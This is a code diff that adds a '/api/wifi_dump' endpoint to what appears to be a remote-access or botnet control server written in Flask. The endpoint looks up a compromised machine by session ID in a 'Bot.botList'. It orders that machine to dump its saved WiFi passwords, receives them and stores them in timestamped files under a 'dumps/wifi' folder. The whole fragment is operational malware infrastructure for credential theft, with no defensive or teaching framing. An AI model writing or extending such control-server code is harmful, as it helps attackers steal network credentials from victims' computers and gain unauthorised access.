@@ -682,6 +682,49 @@ def preview_file():
         logging.error(f"Error in preview_file: {str(e)}")
         return jsonify({'error': str(e)}), 500
 
+@app.route('/api/wifi_dump', methods=['POST'])
+def wifi_dump():
+    """Handle WiFi password dumping"""
+    data = request.get_json()
+    try:
+        session_id = int(data.get('session_id'))
+        if session_id not in Bot.botList:
+            return jsonify({'error': 'Invalid session ID'}), 400
+            
+        bot = Bot.botList[session_id]
+        
+        # Send wifi_dump command
+        bot.reliable_send('wifi_dump')
+        response = bot.reliable_recv()
+        
+        if not response:
+            return jsonify({'error': 'No response from agent'}), 500
+            
+        if response.get('error'):
+            return jsonify({'error': response['error']}), 500
+            
+        # Create dumps directory if it doesn't exist
+        dumps_dir = os.path.join('dumps', 'wifi')
+        os.makedirs(dumps_dir, exist_ok=True)
+        
+        # Save WiFi data to file
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        filename = f'wifi_dump_{session_id}_{timestamp}.json'
+        filepath = os.path.join(dumps_dir, filename)
+        
+        with open(filepath, 'w') as f:
+            f.write(response['wifi_data'])
+            
+        return jsonify({
+            'success': True,
+            'message': response.get('message', 'WiFi passwords dumped successfully'),
+            'path': filepath
+        })
+        
+    except Exception as e:
+        logging.error(f"Error in wifi_dump: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
 if __name__ == '__main__':
     try:
         # Register signal handler
